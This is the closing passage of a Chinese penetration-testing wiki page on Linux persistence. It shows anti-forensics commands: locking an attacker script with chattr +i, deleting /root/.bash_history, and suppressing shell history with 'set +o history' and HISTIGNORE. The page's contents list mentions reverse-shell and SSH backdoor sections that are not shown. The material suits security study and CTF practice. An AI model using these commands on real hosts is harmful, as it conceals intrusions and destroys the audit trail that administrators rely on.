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" width="614" height="114" class="img_ev3q"></p>
<p>可以用以下方法。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123123123</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> --</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418236859952616-d47037a221d93a9ec9429a8018eb5055.jpg" width="1080" height="444" class="img_ev3q"></p>
<p>这样可以看到，命令执行了，文件没删除，命令也没有报错。类似的可以利用bash的\r缺陷，和管道符、重定向符之类的。</p>
<p><strong>创建不能删除的文件(权限隐藏)</strong></p>
<p>这个用法在ctf、awd中应用很多，使用chattr来给与隐藏权限。 这些权限需要使用lsattr这个命令才可以查看到，而如果要修改隐藏权限，则使用chattr这个命令来进行修改。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chattr +i hack.sh</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182381421572564-ed8d64d133ca004779a1807d023fa220.jpg" width="882" height="360" class="img_ev3q"></p>
<p>无法删除。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="删除隐藏历史操作命令">删除/隐藏历史操作命令<a href="#删除隐藏历史操作命令" class="hash-link" aria-label="删除/隐藏历史操作命令的直接链接" title="删除/隐藏历史操作命令的直接链接">​</a></h2>
<p><strong>删除</strong></p>
<p>删除通常使用两种方式：</p>
<ol>
<li><code>history -c</code></li>
<li><code>rm -rf /root/.bash_history</code></li>
</ol>
<p>建议使用第二种，第一种只是当前清除，并没有清除文件内容。</p>
<p><strong>隐藏</strong></p>
<p>隐藏命令的方式有很多，history 只会在会话结束时写入，所以只要会话还没有结束就可以想办法隐藏。比如同时开启两个终端，第一个终端启动vim编辑history文件，等第二个执行的都差不多了，结束会话后，在保存第一个，这样就覆盖了第二个终端所执行的命令。 这里我分享几个经常使用的隐藏历史命令的方法。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">set</span><span class="token plain"> +o </span><span class="token function" style="color:#d73a49">history</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># 不会将任何当前会话写入日志。可以在会话期间任何时间运行，并隐藏所有命令。</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182389395629022-2def026dbb9e43e18f9dd595e76318f0.jpg" width="1080" height="690" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418240019782694-e0e7e69d0d3fb421cb6fe5554f99635e.jpg" width="1080" height="440" class="img_ev3q"></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">HISTIGNORE</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;*|*&quot;</span><span class="token plain"> //这条命令是不记录带有管道符的命令。</span><br></span></code></pre></div></div>
<p>执行后命令可以<code>echo 123123123 | whoami</code>这样也可以做到隐藏命令的目的。</p>
<p><img decoding="async" loading="lazy" src="/assets/images/15823418240928977330-621f25c00fb9fe84d00e04c603c033e6.jpg" width="1080" height="320" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" src="/assets/images/158234182417458496307-a0132264271d3e17bdce031ade5757dc.jpg" width="1080" height="443" class="img_ev3q"></p>
<p><strong>Info：</strong></p>
<blockquote>
<p><a href="https://www.freebuf.com/vuls/205516.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/vuls/205516.html</a></p>
<p><a href="https://www.cnblogs.com/17bdw/p/10564902.html#label0_6" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/17bdw/p/10564902.html#label0_6</a>_</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考链接">参考链接<a href="#参考链接" class="hash-link" aria-label="参考链接的直接链接" title="参考链接的直接链接">​</a></h2>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/B5cam9QN8eDHFuaFjBD34Q" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/B5cam9QN8eDHFuaFjBD34Q</a></p>
<p><a href="https://mp.weixin.qq.com/s/-F_Ol-J-QfynOCYfD1nG3Q" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/-F_Ol-J-QfynOCYfD1nG3Q</a></p>
<p><a href="https://www.secpulse.com/archives/100484.html" target="_blank" rel="noopener noreferrer">https://www.secpulse.com/archives/100484.html</a></p>
</blockquote></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/渗透测试/权限维持/Windows权限维持"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows权限维持</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/渗透测试/权限维持/扩展"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">扩展</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#自我总结" class="table-of-contents__link toc-highlight">自我总结</a></li><li><a href="#linux反弹shell" class="table-of-contents__link toc-highlight">LINUX反弹shell</a></li><li><a href="#ssh后门" class="table-of-contents__link toc-highlight">SSH后门</a><ul><li><a href="#ssh-wrapper" class="table-of-contents__link toc-highlight">SSH wrapper</a></li><li><a href="#ssh-软连接后门" class="table-of-contents__link toc-highlight">SSH 软连接后门</a></li><li><a href="#ssh-公钥免密登陆" class="table-of-contents__link toc-highlight">SSH 公钥免密登陆</a></li><li><a href="#ssh-keylogger" class="table-of-contents__link toc-highlight">SSH Keylogger</a></li><li><a href="#strace监听ssh来源流量" class="table-of-contents__link toc-highlight">strace监听ssh来源流量</a></li></ul></li><li><a href="#cron后门" class="table-of-contents__link toc-highlight">Cron后门</a><ul><li><a href="#hiding-from-cats" class="table-of-contents__link toc-highlight">hiding-from-cats</a></li></ul></li><li><a href="#vim后门" class="table-of-contents__link toc-highlight">vim后门</a><ul><li><a href="#vim-python扩展后门" class="table-of-contents__link toc-highlight">vim python扩展后门</a></li></ul></li><li><a href="#添加超级用户" class="table-of-contents__link toc-highlight">添加超级用户</a></li><li><a href="#suid后门" class="table-of-contents__link toc-highlight">SUID后门</a></li><li><a href="#linuxunix-隐藏文件和文件夹" class="table-of-contents__link toc-highlight">Linux/Unix 隐藏文件和文件夹</a></li><li><a href="#参数混淆拦截rm" class="table-of-contents__link toc-highlight">参数混淆拦截rm</a></li><li><a href="#删除隐藏历史操作命令" class="table-of-contents__link toc-highlight">删除/隐藏历史操作命令</a></li><li><a href="#参考链接" class="table-of-contents__link toc-highlight">参考链接</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>